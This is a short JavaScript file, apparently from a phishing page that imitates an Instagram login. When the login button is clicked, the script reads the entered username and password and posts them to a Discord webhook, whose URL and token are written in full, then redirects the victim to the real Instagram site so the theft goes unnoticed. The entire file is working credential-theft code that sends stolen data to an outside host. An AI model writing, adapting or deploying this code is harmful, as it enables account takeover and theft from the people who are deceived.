document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("login-button").addEventListener("click", function(event) {
        event.preventDefault();

        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        fetch("https://discord.com/api/webhooks/1186714040437850293/6sSqX253LipbEOIYKId-BaW2Kyw4Sj4_4IHe9vWByyFbhANhosn87ubhZICpKC8YcOtr", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: `Username: ${username}, Password: ${password}`
            })
        }).then(response => {
            if (response.ok) {
                // Rediriger vers Instagram si la requête au webhook a réussi
                window.location.href = "https://www.instagram.com/";
            } else {
                // Gérer l'erreur si la requête au webhook échoue
                console.error("Erreur lors de l'envoi des données au webhook");
            }
        }).catch(error => {
            // Gérer les erreurs de réseau ou de connexion
            console.error("Erreur de réseau :", error);
        });
    });
});